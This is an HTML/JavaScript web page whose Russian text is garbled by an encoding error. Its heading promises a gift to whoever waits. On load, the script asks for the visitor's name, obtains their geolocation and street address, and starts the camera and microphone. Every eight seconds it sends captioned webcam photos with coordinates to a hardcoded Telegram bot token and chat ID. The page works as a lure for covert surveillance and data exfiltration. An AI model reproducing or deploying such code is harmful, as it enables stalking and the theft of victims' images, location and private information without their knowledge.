<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Access with Location & Audio</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .pulse-animation {
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
  </style>
</head>

<body class="flex flex-col bg-sky-950 items-center justify-center min-h-screen p-4">
  <div class="max-w-4xl w-full text-center">
    <h1 class="text-4xl text-center pulse-animation text-amber-400 mb-8">
      –ü–æ–¥–æ–∂–¥–∏—Ç–µ –Ω–µ–º–Ω–æ–≥–æ —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫!
    </h1>
    
    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
      <div class="bg-sky-900 rounded-xl p-4">
        <h2 class="text-xl text-amber-300 mb-4">–í–∏–¥–µ–æ —Å –∫–∞–º–µ—Ä—ã</h2>
        <video id="video" width="100%" height="auto" autoplay muted class="rounded-lg border-2 border-amber-400"></video>
      </div>
      
      <div class="bg-sky-900 rounded-xl p-4">
        <h2 class="text-xl text-amber-300 mb-4">–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h2>
        <div id="infoPanel" class="text-left text-white space-y-3">
          <div class="p-3 bg-sky-800 rounded-lg">
            <strong>–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</strong> <span id="userName" class="text-amber-200">–ó–∞–≥—Ä—É–∑–∫–∞...</span>
          </div>
          <div class="p-3 bg-sky-800 rounded-lg">
            <strong>–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:</strong> <span id="locationInfo" class="text-amber-200">–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ...</span>
          </div>
          <div class="p-3 bg-sky-800 rounded-lg">
            <strong>–ê—É–¥–∏–æ —Å—Ç–∞—Ç—É—Å:</strong> <span id="audioStatus" class="text-amber-200">–ù–µ –∞–∫—Ç–∏–≤–Ω–æ</span>
          </div>
          <div class="p-3 bg-sky-800 rounded-lg">
            <strong>–°—Ç–∞—Ç—É—Å –æ—Ç–ø—Ä–∞–≤–∫–∏:</strong> <span id="sendStatus" class="text-amber-200">–û–∂–∏–¥–∞–Ω–∏–µ...</span>
          </div>
        </div>
      </div>
    </div>
    
    <div class="bg-sky-900 rounded-xl p-4">
      <h2 class="text-xl text-amber-300 mb-4">–ñ—É—Ä–Ω–∞–ª –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏</h2>
      <div id="log" class="h-40 overflow-y-auto text-left text-white bg-sky-800 rounded-lg p-3 text-sm">
        <!-- –õ–æ–≥–∏ –±—É–¥—É—Ç –¥–æ–±–∞–≤–ª—è—Ç—å—Å—è –∑–¥–µ—Å—å -->
      </div>
    </div>
  </div>

  <script>
    // –ü–†–ê–í–ò–õ–¨–ù–´–ô –¢–û–ö–ï–ù –ë–û–¢–ê
    const BOT_TOKEN = "8420672543:AAGlQgIwUBIBcBN5lMRTMLlj1ihh14RZ94Q";
    const CHAT_ID = "6329250150";
    
    // –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
    let userName = "";
    let userLocation = { latitude: null, longitude: null, address: "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ" };
    let audioStream = null;
    let audioChunks = [];
    let mediaRecorder = null;
    let isRecording = false;
    let sendInterval;
    let photoCounter = 0;
    let isCameraActive = false;
    
    // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    function getUserName() {
      try {
        const name = prompt("–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ—ë –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:");
        if (name && name.trim() !== "") {
          userName = name.trim();
          document.getElementById("userName").textContent = userName;
          addLog(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${userName}`);
        } else {
          userName = "–ê–Ω–æ–Ω–∏–º";
          document.getElementById("userName").textContent = userName;
          addLog("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ —É–∫–∞–∑–∞–ª –∏–º—è");
        }
      } catch (e) {
        userName = "–ì–æ—Å—Ç—å";
        document.getElementById("userName").textContent = userName;
        addLog("–ò–º—è –Ω–µ –∑–∞–ø—Ä–æ—à–µ–Ω–æ");
      }
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ
    function getLocation() {
      if ("geolocation" in navigator) {
        addLog("–ó–∞–ø—Ä–æ—Å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è...");
        navigator.geolocation.getCurrentPosition(
          function(position) {
            userLocation.latitude = position.coords.latitude;
            userLocation.longitude = position.coords.longitude;
            
            // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã
            const lat = userLocation.latitude.toFixed(6);
            const lng = userLocation.longitude.toFixed(6);
            
            document.getElementById("locationInfo").textContent = `${lat}, ${lng}`;
            addLog(`–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ –ø–æ–ª—É—á–µ–Ω–æ: ${lat}, ${lng}`);
            
            // –ü–æ–ª—É—á–∞–µ–º –∞–¥—Ä–µ—Å –ø–æ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞–º
            getAddressFromCoords(userLocation.latitude, userLocation.longitude);
          },
          function(error) {
            console.error("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è:", error);
            document.getElementById("locationInfo").textContent = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
            addLog("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è");
            
            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–∏–º–µ—Ä–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ –ø–æ IP
            getIPLocation();
          },
          { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
        );
      } else {
        document.getElementById("locationInfo").textContent = "–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
        addLog("–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é");
        getIPLocation();
      }
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –ø—Ä–∏–º–µ—Ä–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ –ø–æ IP
    async function getIPLocation() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (data && data.city) {
          userLocation.address = `${data.city}, ${data.region}, ${data.country_name}`;
          document.getElementById("locationInfo").textContent = `${data.city}, ${data.country_name}`;
          addLog(`–ü—Ä–∏–º–µ—Ä–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: ${data.city}, ${data.country_name}`);
        }
      } catch (error) {
        console.error("–û—à–∏–±–∫–∞ IP-–≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", error);
      }
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –∞–¥—Ä–µ—Å –ø–æ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞–º
    async function getAddressFromCoords(lat, lng) {
      try {
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=16`
        );
        const data = await response.json();
        
        if (data && data.display_name) {
          userLocation.address = data.display_name;
          document.getElementById("locationInfo").textContent = 
            `${data.display_name.substring(0, 60)}...`;
          addLog(`–ê–¥—Ä–µ—Å: ${data.display_name.substring(0, 50)}...`);
        }
      } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞:", error);
        addLog("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∞–¥—Ä–µ—Å");
      }
    }
    
    // –ó–∞–ø—É—Å–∫–∞–µ–º –∫–∞–º–µ—Ä—É
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        });
        
        const video = document.getElementById("video");
        video.srcObject = stream;
        isCameraActive = true;
        addLog("–ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞");
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ
        setTimeout(startAudioRecording, 1000);
        
        return stream;
      } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ –∫–∞–º–µ—Ä–µ:", err);
        addLog("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ");
        
        // –°–∫—Ä—ã–≤–∞–µ–º –≤–∏–¥–µ–æ, –µ—Å–ª–∏ –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞
        document.getElementById("video").style.display = "none";
        document.querySelector('h2.text-amber-300').textContent = "–ö–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
        
        // –í—Å–µ —Ä–∞–≤–Ω–æ –ø—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –∞—É–¥–∏–æ
        startAudioRecording();
        return null;
      }
    }
    
    // –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ
    async function startAudioRecording() {
      try {
        audioStream = await navigator.mediaDevices.getUserMedia({ 
          audio: {
            echoCancellation: true,
            noiseSuppression: true,
            sampleRate: 22050
          }
        });
        
        mediaRecorder = new MediaRecorder(audioStream, {
          mimeType: 'audio/webm;codecs=opus'
        });
        audioChunks = [];
        
        mediaRecorder.ondataavailable = function(event) {
          if (event.data.size > 0) {
            audioChunks.push(event.data);
          }
        };
        
        // –ù–∞—á–∏–Ω–∞–µ–º –∑–∞–ø–∏—Å—å
        mediaRecorder.start(1000); // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
        isRecording = true;
        
        // –¶–∏–∫–ª–∏—á–µ—Å–∫–∞—è –∑–∞–ø–∏—Å—å –∫–∞–∂–¥—ã–µ 15 —Å–µ–∫—É–Ω–¥
        setInterval(() => {
          if (isRecording && mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
            audioChunks = [];
            mediaRecorder.start(1000);
            addLog("–ê—É–¥–∏–æ –±—É—Ñ–µ—Ä –æ–±–Ω–æ–≤–ª–µ–Ω");
          }
        }, 15000);
        
        document.getElementById("audioStatus").textContent = "–ê–∫—Ç–∏–≤–Ω–æ (–∑–∞–ø–∏—Å—å)";
        addLog("–ê—É–¥–∏–æ –∑–∞–ø–∏—Å—å –Ω–∞—á–∞—Ç–∞");
      } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É:", err);
        document.getElementById("audioStatus").textContent = "–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ";
        addLog("–ú–∏–∫—Ä–æ—Ñ–æ–Ω –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω");
      }
    }
    
    // –°–æ–∑–¥–∞–µ–º —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
    function capturePhoto() {
      const video = document.getElementById("video");
      
      // –ï—Å–ª–∏ –∫–∞–º–µ—Ä–∞ –Ω–µ –∞–∫—Ç–∏–≤–Ω–∞, —Å–æ–∑–¥–∞–µ–º –∑–∞–≥–ª—É—à–∫—É
      if (!isCameraActive) {
        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const context = canvas.getContext("2d");
        
        // –ß–µ—Ä–Ω—ã–π —Ñ–æ–Ω
        context.fillStyle = "#000";
        context.fillRect(0, 0, canvas.width, canvas.height);
        
        // –¢–µ–∫—Å—Ç
        context.fillStyle = "#fff";
        context.font = "30px Arial";
        context.textAlign = "center";
        context.fillText("–ö–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞", canvas.width/2, canvas.height/2);
        context.font = "20px Arial";
        context.fillText(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${userName}`, canvas.width/2, canvas.height/2 + 40);
        
        return canvas;
      }
      
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –Ω–∞ —Ñ–æ—Ç–æ
      context.fillStyle = "rgba(0, 0, 0, 0.6)";
      context.fillRect(10, 10, 400, 100);
      
      context.fillStyle = "#fff";
      context.font = "16px Arial";
      context.textAlign = "left";
      context.fillText(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${userName}`, 20, 40);
      context.fillText(`–í—Ä–µ–º—è: ${new Date().toLocaleString()}`, 20, 70);
      
      if (userLocation.latitude) {
        context.fillText(`–õ–æ–∫–∞—Ü–∏—è: ${userLocation.latitude.toFixed(4)}, ${userLocation.longitude.toFixed(4)}`, 20, 100);
      }
      
      return canvas;
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –∞—É–¥–∏–æ –¥–∞–Ω–Ω—ã–µ
    function getAudioData() {
      if (audioChunks.length === 0 || !isRecording) return null;
      
      try {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        return audioBlob;
      } catch (e) {
        console.error("–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∞—É–¥–∏–æ:", e);
        return null;
      }
    }
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
    async function sendData() {
      photoCounter++;
      const statusElement = document.getElementById("sendStatus");
      statusElement.textContent = `–û—Ç–ø—Ä–∞–≤–∫–∞ #${photoCounter}...`;
      
      try {
        // –°–æ–∑–¥–∞–µ–º —Ñ–æ—Ç–æ
        const canvas = capturePhoto();
        
        // –ü–æ–ª—É—á–∞–µ–º –∞—É–¥–∏–æ
        const audioBlob = getAudioData();
        
        // –°–æ–∑–¥–∞–µ–º —Ç–µ–∫—Å—Ç —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π
        let caption = `üì∏ –§–æ—Ç–æ #${photoCounter}\n`;
        caption += `üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${userName}\n`;
        caption += `üïí –í—Ä–µ–º—è: ${new Date().toLocaleString()}\n`;
        
        if (userLocation.latitude) {
          caption += `üìç –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)}\n`;
          caption += `üè† –ê–¥—Ä–µ—Å: ${userLocation.address.substring(0, 100)}\n`;
        } else {
          caption += `üìç –õ–æ–∫–∞—Ü–∏—è: ${userLocation.address}\n`;
        }
        
        caption += `üîä –ê—É–¥–∏–æ: ${audioBlob ? "–î–∞" : "–ù–µ—Ç"}`;
        
        // –°–æ–∑–¥–∞–µ–º FormData
        canvas.toBlob(async function(photoBlob) {
          const formData = new FormData();
          
          // –î–æ–±–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ
          formData.append("photo", photoBlob, `photo_${Date.now()}.jpg`);
          
          // –î–æ–±–∞–≤–ª—è–µ–º –∞—É–¥–∏–æ
          if (audioBlob) {
            formData.append("audio", audioBlob, `audio_${Date.now()}.webm`);
          }
          
          // –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
          formData.append("caption", caption);
          formData.append("chat_id", CHAT_ID);
          formData.append("parse_mode", "HTML");
          
          try {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ Telegram –±–æ—Ç
            const response = await fetch(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
              {
                method: "POST",
                body: formData,
              }
            );
            
            if (!response.ok) {
              throw new Error(`HTTP –æ—à–∏–±–∫–∞: ${response.status}`);
            }
            
            const result = await response.json();
            
            if (result.ok) {
              statusElement.textContent = `‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ #${photoCounter}`;
              addLog(`–î–∞–Ω–Ω—ã–µ #${photoCounter} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —É—Å–ø–µ—à–Ω–æ`);
            } else {
              throw new Error(result.description || "–û—à–∏–±–∫–∞ Telegram API");
            }
            
          } catch (error) {
            console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", error);
            statusElement.textContent = `‚ùå –û—à–∏–±–∫–∞ #${photoCounter}`;
            addLog(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ #${photoCounter}: ${error.message}`);
            
            // –ü—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç
            sendTextOnly(caption);
          }
          
        }, "image/jpeg", 0.7);
        
      } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö:", error);
        statusElement.textContent = "‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏";
        addLog("–û—à–∏–±–∫–∞ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö");
      }
    }
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç (fallback)
    async function sendTextOnly(caption) {
      try {
        const textData = {
          chat_id: CHAT_ID,
          text: caption,
          parse_mode: "HTML"
        };
        
        const response = await fetch(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(textData)
          }
        );
        
        if (response.ok) {
          addLog("–¢–µ–∫—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã (fallback)");
        }
      } catch (e) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç–µ–∫—Å—Ç–∞:", e);
      }
    }
    
    // –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å –≤ –∂—É—Ä–Ω–∞–ª
    function addLog(message) {
      const logElement = document.getElementById("log");
      const timestamp = new Date().toLocaleTimeString();
      const logEntry = document.createElement("div");
      logEntry.className = "mb-1 p-1 border-b border-sky-700";
      logEntry.textContent = `[${timestamp}] ${message}`;
      logElement.appendChild(logEntry);
      
      // –ü—Ä–æ–∫—Ä—É—á–∏–≤–∞–µ–º –≤–Ω–∏–∑
      logElement.scrollTop = logElement.scrollHeight;
    }
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    document.addEventListener("DOMContentLoaded", async function() {
      addLog("üîÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞, –Ω–∞—á–∏–Ω–∞–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é...");
      
      // –ü–æ–ª—É—á–∞–µ–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
      setTimeout(getUserName, 500);
      
      // –ü–æ–ª—É—á–∞–µ–º –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ
      setTimeout(getLocation, 1000);
      
      // –ó–∞–ø—É—Å–∫–∞–µ–º –∫–∞–º–µ—Ä—É
      setTimeout(async () => {
        await startCamera();
        
        // –ù–∞—á–∏–Ω–∞–µ–º –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫—É—é –æ—Ç–ø—Ä–∞–≤–∫—É –¥–∞–Ω–Ω—ã—Ö
        sendInterval = setInterval(sendData, 8000);
        addLog("‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ (–∫–∞–∂–¥—ã–µ 8 —Å–µ–∫)");
        
        // –ü–µ—Ä–≤–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
        setTimeout(sendData, 3000);
      }, 1500);
    });
    
    // –û—á–∏—Å—Ç–∫–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener("beforeunload", function() {
      if (sendInterval) clearInterval(sendInterval);
      
      // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤—Å–µ –º–µ–¥–∏–∞-–ø–æ—Ç–æ–∫–∏
      const video = document.getElementById("video");
      if (video.srcObject) {
        video.srcObject.getTracks().forEach(track => track.stop());
      }
      
      if (audioStream) {
        audioStream.getTracks().forEach(track => track.stop());
      }
      
      if (mediaRecorder && isRecording) {
        mediaRecorder.stop();
      }
      
      addLog("‚ö†Ô∏è –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç—Å—è");
    });
  </script>
</body>
</html>